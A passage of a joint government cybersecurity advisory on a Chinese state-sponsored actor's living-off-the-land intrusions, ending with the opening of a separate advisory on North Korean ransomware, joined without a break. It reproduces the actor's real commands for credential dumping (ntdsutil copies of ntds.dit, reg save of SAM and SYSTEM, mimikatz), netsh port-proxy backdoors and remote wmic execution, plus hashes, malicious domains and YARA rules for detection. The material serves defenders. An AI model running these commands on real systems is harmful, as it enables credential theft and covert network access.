for removing malicious actors from victim networks, such as CISA's Eviction Guidance
for Network Affected by the SolarWinds and Active Directory/M365 Compromise.
In addition to the above TTPs used by the actor to copy the ntds.dit file, the following
tools could be used by an actor to obtain the same information:
Secretsdump.py
 Note: This script is a component of Impacket, which the actor has been
known to use
Invoke-NinjaCopy (PowerShell)
DSInternals (PowerShell)
FgDump
Metasploit
Best practices for securing ntds.dit include hardening Domain Controllers and
monitoring event logs for ntdsutil.exe and similar process creations. Additionally, any
use of administrator privileges should be audited and validated to confirm the legitimacy
of executed commands.
PortProxy
The actor has used the following commands to enable port forwarding [T1090] on the
host:
"cmd.exe /c "netsh interface portproxy add v4tov4
listenaddress=0.0.0.0 listenport=9999
connectaddress=<rfc1918 internal ip address>
connectport=8443 protocol=tcp""
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
"cmd.exe /c netsh interface portproxy add v4tov4
listenport=50100 listenaddress=0.0.0.0 connectport=1433
connectaddress=<rfc1918 internal ip address>"
where <rfc1918 internal ip address> is replaced with an IPv4 address
internal to the network, omitting the < >
Netsh is a built-in Windows command line scripting utility that can display or modify the
network settings of a host, including the Windows Firewall. The portproxy add command
is used to create a host:port proxy that will forward incoming connections on the
provided listenaddress and listenport to the connectaddress and connectport.
Administrative privileges are required to execute the portproxy command. Each
portproxy command above will create a registry key in the
HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\ path.
Defenders should look for the presences of keys in this path and investigate any
anomalous entries.
Note: Using port proxies is not common for legitimate system administration since they
can constitute a backdoor into the network that bypasses firewall policies.
Administrators should limit port proxy usage within environments and only enable them
for the period of time in which they are required.
Defenders should also use unusual IP addresses and ports in the command lines or
registry entries to identify other hosts that are potentially included in actor actions. All
hosts on the network should be examined for new and unusual firewall and port
forwarding rules, as well as IP addresses and ports specified by the actor. If network
traffic or logging is available, defenders should attempt to identify what traffic was
forwarded though the port proxies to aid in the hunt operation. As previously mentioned,
identifying the associated user account that made the networking changes can also aid
in the hunt operation.
Firewall rule additions and changes can be viewed in Windows Event Viewer by
navigating to: Applications and Service Logs | Microsoft | Windows |
Windows Firewall With Advanced Security | Firewall.
In addition to host-level changes, defenders should review perimeter firewall
configurations for unauthorized changes and/or entries that may permit external
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
connections to internal hosts. The actor is known to target perimeter devices in their
operations. Firewall logs should be reviewed for any connections to systems on the
ports listed in any portproxy commands discovered.
PowerShell
The actor has used the following PowerShell [T1059.001] command to identify
successful logons to the host [T1033]:
Get-EventLog security -instanceid 4624
Note: Event ID 4624 is logged when a user successfully logs on to a host and
contains useful information such as the logon type (e.g., interactive or
networking), associated user and computer account names, and the logon time.
Event ID 4624 entries can be viewed in Windows Event Viewer by navigating to:
Windows Logs | Security. PowerShell logs can be viewed in Event Viewer:
Applications and Service Logs | Windows PowerShell.
This command identifies what user account they are currently leveraging to access the
network, identify other users logged on to the host, or identify how their actions are
being logged. If the actor is using a password spray technique [T1110.003], there may
be several failed logon (Event ID 4625) events for several different user accounts,
followed by one or more successful logons (Event ID 4624) within a short period of time.
This period may vary by actor but can range from a few seconds to a few minutes.
If the actor is using brute force password attempts [T1110] against a single user
account, there may be several Event ID 4625 entries for that account, followed by a
successful logon Event ID 4624. Defenders should also look for abnormal account
activity, such as logons outside of normal working hours and impossible time-anddistance logons (e.g., a user logging on from two geographically separated locations at
the same time).
Impacket
The actor regularly employs the use of Impacket
s wmiexec, which redirects output to a
file within the victim host
s ADMIN$ share (C:\Windows\) containing an epoch
timestamp in its name. The following is an example of the 
 command being
executed by wmiexec.py:
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
cmd.exe /Q /c dir 1>
\\127.0.0.1\ADMIN$\__1684956600.123456 2>&1
Note: Discovery of an entry similar to the example above in the Windows Event
Log and/or a file with a name in a similar format may be evidence of malicious
activity and should be investigated further. In the event that only a filename is
discovered, the epoch timestamp within the filename reflects the time of
execution by default and can be used to help scope threat hunting activities.
Enumeration of the environment
The following commands were used by the actor to enumerate the network topology
[T1016], the active directory structure [T1069.002], and other information about the
target environment [T1069.001], [T1082]:
arp -a
curl www.ip-api.com
dnscmd . /enumrecords /zone {REDACTED}
dnscmd . /enumzones
dnscmd /enumrecords {REDACTED} . /additional
ipconfig /all
ldifde.exe -f c:\windows\temp\<filename>.txt -p subtree
net localgroup administrators
net group /dom
net group "Domain Admins" /dom
netsh interface firewall show all
netsh interface portproxy show all
netsh interface portproxy show v4tov4
netsh firewall show all
netsh portproxy show v4tov4
netstat -ano
reg query hklm\software\
systeminfo
tasklist /v
whoami
wmic volume list brief
wmic service brief
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
wmic product list brief
wmic baseboard list full
wevtutil qe security /rd:true /f:text
/q:*[System[(EventID=4624) and
TimeCreated[@SystemTime>='{REDACTED}']] and
EventData[Data='{REDACTED}']]
Additional credential theft
The actor also used the following commands to identify additional opportunities for
obtaining credentials in the environment [T1555], [T1003]:
dir C:\Users\{REDACTED}\.ssh\known_hosts
C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profile
mimikatz.exe
reg query hklm\software\OpenSSH
reg query hklm\software\OpenSSH\Agent
reg query hklm\software\realvnc
reg query hklm\software\realvnc\vncserver
reg query hklm\software\realvnc\Allusers
reg query hklm\software\realvnc\Allusers\vncserver
reg query hkcu\software\{REDACTED}\putty\session
reg save hklm\sam ss.dat
reg save hklm\system sy.dat
Additional commands
The actor executed the following additional commands:
7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z
C:\Windows\system32\pcwrun.exe
C:\Users\Administrator\Desktop\Win.exe
C:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 >
C:\Windows\temp\putty.log
C:\Windows\Temp\tmp.log
"cmd.exe" /c dir \\127.0.0.1\C$ /od
"cmd.exe" /c ping 
n 1 <IP address>
"cmd.exe" /c wmic /user:<username> /password:<password>
process call create "net stop \"<service name>\" >
C:\Windows\Temp\tmp.log"
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value>
2>&1
net use \\127.0.0.1\IPC$ /y /d
powershell start-process -filepath
c:\windows\temp\<filename>.bat -windowstyle Hidden
rar.exe a 
{REDACTED} c:\Windows\temp\{REDACTED}
D:\{REDACTED}\
wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED}
cmd /c whoami
xcopy C:\windows\temp\hp d:\{REDACTED}
Mitigations
The authoring agencies recommend organizations implement the mitigations below to
improve your organization
s cybersecurity posture on the basis of the threat actor
activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals
(CPGs) developed by CISA and the National Institute of Standards and Technology
(NIST). The CPGs provide a minimum set of practices and protections that CISA and
NIST recommend all organizations implement. CISA and NIST based the CPGs on
existing cybersecurity Frameworks and guidance to protect against the most common
and impactful threats and TTPs. Visit CISA
s Cross-Sector Cybersecurity Performance
Goals for more information on the CPGs, including additional recommended baseline
protections.
Defenders should harden domain controllers and monitor event logs [2.T] for
ntdsutil.exe and similar process creations. Additionally, any use of administrator
privileges should be audited and validated to confirm the legitimacy of executed
commands.
Administrators should limit port proxy usage within environments and only enable
them for the period of time in which they are required [2.X].
Defenders should investigate unusual IP addresses and ports in command lines,
registry entries, and firewall logs to identify other hosts that are potentially
involved in actor actions.
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
In addition to host-level changes, defenders should review perimeter firewall
configurations for unauthorized changes and/or entries that may permit external
connections to internal hosts.
Defenders should also look for abnormal account activity, such as logons outside
of normal working hours and impossible time-and-distance logons (e.g., a user
logging on from two geographically separated locations at the same time).
Defenders should forward log files to a hardened centralized logging server,
preferably on a segmented network [2.F].
Logging recommendations
To be able to detect the activity described in this CSA, defenders should set the audit
policy for Windows security logs to include 
audit process creation
 and 
include
command line in process creation events
 in addition to accessing the logs.
Otherwise, the default logging configurations may not contain the necessary
information.
Enabling these options will create Event ID 4688 entries in the Windows Security log to
view command line processes. Given the cost and difficulty of logging and analyzing
this kind of activity, if an organization must limit the requirements, they should focus on
enabling this kind of logging on systems that are externally facing or perform
authentication or authorization, especially including domain controllers.
To hunt for the malicious WMI and PowerShell activity, defenders should also log WMI
and PowerShell events. By default, WMI Tracing and deep PowerShell logging are not
enabled, but they can be enabled by following the configuration instructions linked in the
References section.
The actor takes measures to hide their tracks, such as clearing logs [T1070.001]. To
ensure log integrity and availability, defenders should forward log files to a hardened
centralized logging server, preferably on a segmented network. Such an architecture
makes it harder for an actor to cover their tracks as evidence of their actions will be
captured in multiple locations.
Defenders should also monitor logs for Event ID 1102, which is generated when the
audit log is cleared. All Event ID 1102 entries should be investigated as logs are
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
generally not cleared and this is a known actor tactic to cover their tracks. Even if an
event log is cleared on a host, if the logs are also stored on a logging server, the copy of
the log will be preserved.
This activity is often linked to malicious exploitation of edge devices and network
management devices. Defenders should enable logging on their edge devices, to
include system logs, to be able to identify potential exploitation and lateral movement.
They should also enable network-level logging, such as sysmon, webserver,
middleware, and network device logs.
Indicators of compromise (IOCs) summary
TTPs
Exploiting vulnerabilities [T1190] in widely used software including, but not limited
 CVE-2021-40539
ManageEngine ADSelfService Plus.
 https://www.cisa.gov/uscert/ncas/alerts/aa21-259a.
 CVE-2021-27860
FatPipe WARP, IPVPN, MPVPN.
 https://www.ic3.gov/Media/News/2021/211117-2.pdf.
Using webshells for persistence and exfiltration [T1505.003], with at least some
of the webshells derived from the Awen webshell.
Using compromised Small-Office Home-Office (SOHO) devices (e.g. routers) to
obfuscate the source of the activity [T1090.002].
 Most common types include ASUS, Cisco RV, Draytek Vigor, FatPipe
IPVPN/MPVPN/WARP, Fortinet Fortigate, Netgear Prosafe, and Zyxel
USG devices.
 Common CVEs for these devices and mitigation guidance can be found in
the joint Cybersecurity Advisory, 
Top CVEs Actively Exploited by
People
s Republic of China State-Sponsored Cyber Actors.
Using living off the land tools for discovery, lateral movement, and collection
activities, to include:
 certutil
 dnscmd
 ldifde
 makecab
 net user/group/use
 netsh
 nltest
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
 ntdsutil
 PowerShell
 req query/save
 systeminfo
 tasklist
 wevtutil
 wmic
 xcopy
Selective clearing of Windows Event Logs, system logs, and other technical
artifacts to remove evidence of their intrusion activity [T1070].
Using open source 
hacktools
 tools, such as:
 Fast Reverse Proxy (frp)
 Probably derived from the publicly-available fatedier and
EarthWorm variants.
 Impacket
 To detect Impacket usage, see the joint Cybersecurity Advisory:
"Impacket and Exfiltration Tool Used to Steal Sensitive Information
from Defense Industrial Base Organization
 Mimikatz.exe
 Remote administration tools
 Defenders should consult the joint Cybersecurity Advisory:
"Protecting Against Malicious Use of Remote Monitoring and
Management Software".
Command execution
File names and directory paths used in these commands are only meant to serve as
examples. Actual names and paths may differ depending on environment and activity,
so defenders should account for variants when performing queries.
Note: Many of the commands are derivatives of common system administration
commands that could generate false positives when used alone without additional
indicators.
7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z
c:\windows\temp\*
"C:\pstools\psexec.exe" \\{REDACTED} -s cmd /c "cmd.exe /c
"netsh interface portproxy delete v4tov4
listenaddress=0.0.0.0 listenport=9999""
C:\Windows\system32\pcwrun.exe
C:\Users\Administrator\Desktop\Win.exe
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
cmd.exe /C dir /S \\{REDACTED}\c$\Users\{REDACTED} >>
c:\windows\temp\{REDACTED}.tmp
"cmd.exe" /c wmic process call create "cmd.exe /c mkdir
C:\windows\Temp\McAfee_Logs & ntdsutil \"ac i ntds\" ifm
\"create full C:\Windows\Temp\McAfee_Logs\"
cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value>
2>&1
cmd.exe /Q /c net group "domain admins" /dom
1>\\127.0.0.1\ADMIN$\__<timestamp value> 2>&1
cmd.exe /Q /c wmic process call create "cmd.exe /c mkdir
C:\Windows\Temp\tmp & ntdsutil \"ac i ntds\" ifm \"create
full C:\Windows\Temp\tmp\" 1>
\\127.0.0.1\ADMIN$\<timestamp value> 2>&1
D:\{REDACTED}\xcopy C:\windows\temp\hp d:\{REDACTED}
Get-EventLog security -instanceid 4624
ldifde.exe -f c:\windows\temp\cisco_up.txt -p subtree
makecab ..\backup\210829-020000.zip
..\webapps\adssp\html\Lock.lic
move "\\<redacted>\c$\users\public\Appfile\registry\SYSTEM"
..\backup\210829-020000.zip
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0
listenport=9999 connectaddress={REDACTED} connectport=8443
protocol=tcp
netsh interface portproxy delete v4tov4
listenaddress=0.0.0.0 listenport=9999
Rar.exe a 
{REDACTED} c:\Windows\temp\DMBC2C61.tmp
start-process -filepath c:\windows\temp\<filename>.bat windowstyle hidden 1
Note: The batch file in question (<filename>.bat) could use any name, and no
discernable pattern has been determined at this time.
wmic process call create "cmd.exe /c mkdir
C:\users\public\Appfile & ntdsutil \"ac i ntds\" ifm
\"create full C:\users\public\Appfile\" q q
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
wmic process call create "cmd.exe /c mkdir
C:\Windows\Temp\tmp & ntdsutil \"ac i ntds\" ifm \"create
full C:\Windows\Temp\tmp\"
wmic process call create "cmd.exe /c ntdsutil \"ac i ntds\"
ifm \"create full C:\Windows\Temp\Pro"
wmic process call create "ntdsutil \"ac i ntds\" ifm
\"create full C:\Windows\Temp\"
Command line patterns
Certain patterns in commands (with asterisks for wildcards) can be used to identify
potentially malicious commands:
cmd.exe /C dir /S \\* >> *
cmd.exe /Q /c * 1> \\127.0.0.1\ADMIN$\__*.*>&1
powershell start-process -filepath c:\windows\temp\*.exe windowstyle hidden
File paths
The most common paths where files and executables used by the actor have been
found include:
C:\Users\Public\Appfile (including subdirectories)
C:\Perflogs (including subdirectories)
C:\Windows\Temp (including subdirectories)
File names
The file names the actor has previously used for such things as malware, scripts, and
tools include:
backup.bat
billagent.exe
billaudit.exe
cisco_up.exe
cl64.exe
nc.exe
rar.exe
SMSvcService.exe
update.bat
update.exe
vm3dservice.exe
watchdogd.exe
Win.exe
WmiPrvSE.exe
WmiPreSV.exe
In addition to the file names and paths above, malicious files names, believed to be
randomly created, in the following format have also been discovered:
C:\Windows\[a-zA-Z]{8}.exe
SHA-256 file hashes
f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd
ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31
d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d
66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7
3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71
41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597
c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99
3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f
fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15
ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484
User-agent
In some cases, the following user-agent string (including the extra spacing) was
identified performing reconnaissance activities by this actor:
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0)
Gecko/20100101 Firefox/68.0
Note: The spacing between 
 and 
Gecko
 is 3 tabs followed by 4 spaces.
Yara rules
rule ShellJSP {
strings:
$s1 = "decrypt(fpath)"
$s2 = "decrypt(fcontext)"
$s3 = "decrypt(commandEnc)"
$s4 = "upload failed!"
$s5 = "aes.encrypt(allStr)"
$s6 = "newid"
condition:
filesize < 50KB and 4 of them
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
rule EncryptJSP {
strings:
$s1 = "AEScrypt"
$s2 = "AES/CBC/PKCS5Padding"
$s3 = "SecretKeySpec"
$s4 = "FileOutputStream"
$s5 = "getParameter"
$s6 = "new ProcessBuilder"
$s7 = "new BufferedReader"
$s8 = "readLine()"
condition:
filesize < 50KB and 6 of them
rule CustomFRPClient {
meta:
description=
Identify instances of the actor's custom FRP tool based
on unique strings chosen by the actor and included in the tool
strings:
$s1 = "%!PS-Adobe-" nocase ascii wide
$s2 = "github.com/fatedier/frp/cmd/frpc" nocase ascii wide
$s3 = "github.com/fatedier/frp/cmd/frpc/sub.startService" nocase
ascii wide
$s4 = "MAGA2024!!!" nocase ascii wide
$s5 = "HTTP_PROXYHost: %s" nocase ascii wide
condition:
all of them
rule HACKTOOL_FRPClient {
meta:
description=
Identify instances of FRP tool (Note: This tool is
known to be used by multiple actors, so hits would not necessarily imply
activity by the specific actor described in this report)
strings:
$s1 = "%!PS-Adobe-" nocase ascii wide
$s2 = "github.com/fatedier/frp/cmd/frpc" nocase ascii wide
$s3 = "github.com/fatedier/frp/cmd/frpc/sub.startService" nocase
ascii wide
$s4 = "HTTP_PROXYHost: %s" nocase ascii wide
condition:
3 of them
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
References
Active Directory and domain controller hardening:
 Best practices: https://learn.microsoft.com/en-us/windows-server/identity/adds/plan/security-best-practices/best-practices-for-securing-active-directory
CISA regional cyber threats:
 PRC state-sponsored activity: China Cyber Threat Overview and Advisories
Microsoft Threat Intelligence blog:
 Volt Typhoon activity: https://www.microsoft.com/enus/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-withliving-off-the-land-techniques/
Ntdsutil.exe:
 Overview: https://learn.microsoft.com/en-us/previous-versions/windows/itpro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)
PowerShell:
 Best practices: https://media.defense.gov/2022/Jun/22/2003021689/-1/1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_
EMBRACE_20220622.PDF
 Logging configuration: https://www.mandiant.com/resources/blog/greater-visibility
Windows command line process auditing:
 Overview: https://learn.microsoft.com/en-us/windows-server/identity/adds/manage/component-updates/command-line-process-auditing
Windows Defender Firewall:
 Best practices: https://learn.microsoft.com/en-us/windows/security/threatprotection/windows-firewall/best-practices-configuring
 Logging configuration: https://learn.microsoft.com/en-us/windows/security/threatprotection/windows-firewall/configure-the-windows-firewall-log
Windows management instrumentation:
 Events: https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracing-wmiactivity#obtaining-wmi-events-through-event-viewer
 Tracing activity: https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracingwmi-activity
Windows password spraying:
 Logging and playbook configuration: https://learn.microsoft.com/enus/security/compass/incident-response-playbook-password-spray
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
Acknowledgements
The NSA Cybersecurity Collaboration Center, along with the authoring agencies,
acknowledge Amazon Web Services (AWS) Security, Broadcom, Cisco Talos, Google's
Threat Analysis Group, Lumen Technologies, Mandiant, Microsoft Threat Intelligence
(MSTI), Palo Alto Networks, SecureWorks, SentinelOne, Trellix, and additional industry
partners for their collaboration on this advisory.
Disclaimer of endorsement
The information and opinions contained in this document are provided "as is" and without any warranties
or guarantees. Reference herein to any specific commercial products, process, or service by trade name,
trademark, manufacturer, or otherwise does not constitute or imply its endorsement, recommendation, or
favoring by the authoring agencies
 governments, and this guidance shall not be used for advertising or
product endorsement purposes.
Trademark recognition
Active Directory
, Microsoft
, PowerShell
, and Windows
 are registered trademarks of Microsoft
Corporation. MITRE
 and ATT&CK
 are registered trademarks of The MITRE Corporation.
Purpose
This document was developed in furtherance of the authoring agencies
 cybersecurity missions, including
their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity
specifications and mitigations. This information may be shared broadly to reach all appropriate
stakeholders.
Contact
U.S. organizations: Urgently report any anomalous activity or incidents, including based upon technical
information associated with this Cybersecurity Advisory, to CISA at Report@cisa.dhs.gov or
cisa.gov/report or to the FBI via your local FBI field office listed at https://www.fbi.gov/contact-us/fieldoffices.
NSA Cybersecurity Report Questions and Feedback: CybersecurityReports@nsa.gov
NSA Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
NSA Media Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov
Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report
cybersecurity incidents and to access alerts and advisories.
Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.
New Zealand organizations: Report cyber security incidents to incidents@ncsc.govt.nz or call 04 498
7654.
United Kingdom organizations: Report a significant cyber security incident at ncsc.gov.uk/report-anincident (monitored 24 hours) or, for urgent assistance, call 03000 200 973.
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
Appendix: MITRE ATT&CK Techniques
Table 2 captures all referenced threat actor tactics and techniques in this advisory.
Table 2: All referenced threat actor tactics and techniques
Initial Access
Technique Title
Exploit Public-facing Application
T1190
Actor used public-facing applications to gain
initial access to systems; in this case,
Earthworm and PortProxy.
Execution
Windows Management
Instrumentation
T1047
The actor executed WMIC commands to
create a copy of the SYSTEM registry.
Command and Scripting
Interpreter: PowerShell
T1059.001
The actor used a PowerShell command to
identify successful logons to the host.
T1059.003
The actor used this primary command
prompt to execute a query that collected
information about the storage devices on
the local host.
Command and Scripting
Interpreter: Windows Command
Shell
Persistence
Server Software Component: Web
Shell
T1505.003
The actor used backdoor web servers with
web shells to establish persistence to
systems, including some of the webshells
being derived from Awen webshell.
Defense Evasion
Indicator Removal
T1070
The actor selectively cleared Windows
Event Logs, system logs, and other
technical artifacts to remove evidence of
their intrusion activity.
Indicator Removal: Clear Windows
Event Logs
T1070.001
The actor cleared system event logs to hide
activity of an intrusion.
Credential Access
OS Credential Dumping: NTDS
T1003.003
The actor may try to exfiltrate the ntds.dit
file and the SYSTEM registry hive out of the
network to perform password cracking.
Brute Force
T1110
The actor attempted to gain access to
accounts with multiple password attempts.
Brute Force: Password Spraying
OS Credential Dumping
T1110.003
T1003
The actor used commonly used passwords
against accounts to attempt to acquire valid
credentials.
The actor used additional commands to
obtain credentials in the environment.
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
PRC State-Sponsored Cyber Actor Living off the Land to Evade Detection
TLP:CLEAR
Credentials from Password Stores
T1555
The actor searched for common password
storage locations.
Discovery
System Information Discovery
T1082
The actor executed commands to gather
information about local drives.
System Owner/User Discovery
T1033
The actor gathered information about
successful logons to the host using a
PowerShell command.
Permission Groups Discovery:
Local Groups
T1069.001
The actor attempt to find local system
groups and permission settings.
Permission Groups Discovery:
Doman Groups
T1069.002
The actor used commands to enumerate
the active directory structure.
System Network Configuration
Discovery
T1016
The actor used commands to enumerate
the network topology.
Command and Control
Proxy
T1090
The actor used commands to enable port
forwarding on the host.
Proxy: External Proxy
T1090.002
The actor used compromised SOHO
devices (e.g. routers) to obfuscate the
source of their activity.
TLP:CLEAR
U/OO/156893-23 | PP-23-1143 | JUN 2023 Ver. 1.1
TLP:CLEAR
Cybersecurity Advisory
#StopRansomware: Ransomware Attacks on Critical
Infrastructure Fund DPRK Malicious Cyber Activities
Summary
Note: This Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort
to publish advisories for network defenders that detail various ransomware variants and
various ransomware threat actors. These #StopRansomware advisories detail
historically and recently observed tactics, techniques, and procedures (TTPs) and
indicators of compromise (IOCs) to help organizations protect against ransomware. Visit
stopransomware.gov to see all #StopRansomware advisories and to learn about other
ransomware threats and no-cost resources.
The United States National Security Agency (NSA), the U.S. Federal Bureau of
Investigation (FBI), the U.S. Cybersecurity and Infrastructure Security Agency (CISA),
the U.S. Department of Health and Human Services (HHS), the Republic of Korea
(ROK) National Intelligence Service (NIS), and the ROK Defense Security Agency
(DSA) (hereafter referred to as the 
authoring agencies
) are issuing this joint
Cybersecurity Advisory (CSA) to highlight ongoing ransomware activity against
Healthcare and Public Health Sector organizations and other critical infrastructure
sector entities.
This CSA provides an overview of Democratic People
s Republic of Korea (DPRK)
state-sponsored ransomware and updates the July 6, 2022, joint CSA North Korean
State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and
Public Health Sector. This advisory highlights TTPs and IOCs DPRK cyber actors used
to gain access to and conduct ransomware attacks against Healthcare and Public
Health (HPH) Sector organizations and other critical infrastructure sector entities, as
well as DPRK cyber actors
 use of cryptocurrency to demand ransoms.
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
The authoring agencies assess that an unspecified amount of revenue from these
cryptocurrency operations supports DPRK national-level priorities and objectives,
including cyber operations targeting the United States and South Korea governments
specific targets include Department of Defense Information Networks and Defense
Industrial Base member networks. The IOCs in this product should be useful to sectors
previously targeted by DPRK cyber operations (e.g., U.S. government, Department of
Defense, and Defense Industrial Base). The authoring agencies highly discourage
paying ransoms as doing so does not guarantee files and records will be recovered and
may pose sanctions risks.
For additional information on state-sponsored DPRK malicious cyber activity, see
CISA
s North Korea Cyber Threat Overview and Advisories webpage.
For a downloadable copy of IOCs, see AA23-040A.stix (STIX, 197 kb).
Technical Details
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 12. See
MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
This CSA is supplementary to previous reports on malicious cyber actor activities
involving DPRK ransomware campaigns
namely Maui and H0lyGh0st ransomware.
The authoring agencies are issuing this advisory to highlight additional observed TTPs
DPRK cyber actors are using to conduct ransomware attacks targeting South Korean
and U.S. healthcare systems.
Observable TTPs
The TTPs associated with DPRK ransomware attacks include those traditionally
observed in ransomware operations. Additionally, these TTPs span phases from
acquiring and purchasing infrastructure to concealing DPRK affiliation:
Acquire Infrastructure [T1583]. DPRK actors generate domains, personas, and
accounts; and identify cryptocurrency services to conduct their ransomware
operations. Actors procure infrastructure, IP addresses, and domains with
cryptocurrency generated through illicit cybercrime, such as ransomware and
cryptocurrency theft.
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
Obfuscate Identity. DPRK actors purposely obfuscate their involvement by
operating with or under third-party foreign affiliate identities and use third-party
foreign intermediaries to receive ransom payments.
Purchase VPNs and VPSs [T1583.003]. DPRK cyber actors will also use virtual
private networks (VPNs) and virtual private servers (VPSs) or third-country IP
addresses to appear to be from innocuous locations instead of from DPRK.
Gain Access [TA0001]. Actors use various exploits of common vulnerabilities
and exposures (CVE) to gain access and escalate privileges on networks.
Recently observed CVEs that actors used to gain access include remote code
execution in the Apache Log4j software library (known as Log4Shell) and remote
code execution in unpatched SonicWall SMA 100 appliances [T1190 and T1133].
Observed CVEs used include:
o CVE 2021-44228
o CVE-2021-20038
o CVE-2022-24990
Actors also likely spread malicious code through Trojanized files for 
X-Popup,
 an open
source messenger commonly used by employees of small and medium hospitals in
South Korea [T1195].
The actors spread malware by leveraging two domains: xpopup.pe[.]kr and
xpopup.com. xpopup.pe[.]kr is registered to IP address 115.68.95[.]128 and
xpopup[.]com is registered to IP address 119.205.197[.]111. Related file names and
hashes are listed in table 1.
Table 1: Malicious file names and hashes spread by xpopup domains
File Name
MD5 Hash
xpopup.rar
1f239db751ce9a374eb9f908c74a31c9
X-PopUp.exe
6fb13b1b4b42bac05a2ba629f04e3d03
X-PopUp.exe
cf8ba073db7f4023af2b13dd75565f3d
xpopup.exe
4e71d52fc39f89204a734b19db1330d3
x-PopUp.exe
43d4994635f72852f719abb604c4a8a1
xpopup.exe
5ae71e8440bf33b46554ce7a7f3de666
U/OO/114471-23 | PP-23-0183 | FEB 2023 Ver. 1.2
TLP:CLEAR
TLP:CLEAR
Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities
Move Laterally and Discovery [TA0007, TA0008]. After initial access, DPRK
cyber actors use staged payloads with customized malware to perform
reconnaissance activities, upload and download additional files and executables,
and execute shell commands [T1083, T1021]. The staged malware is also
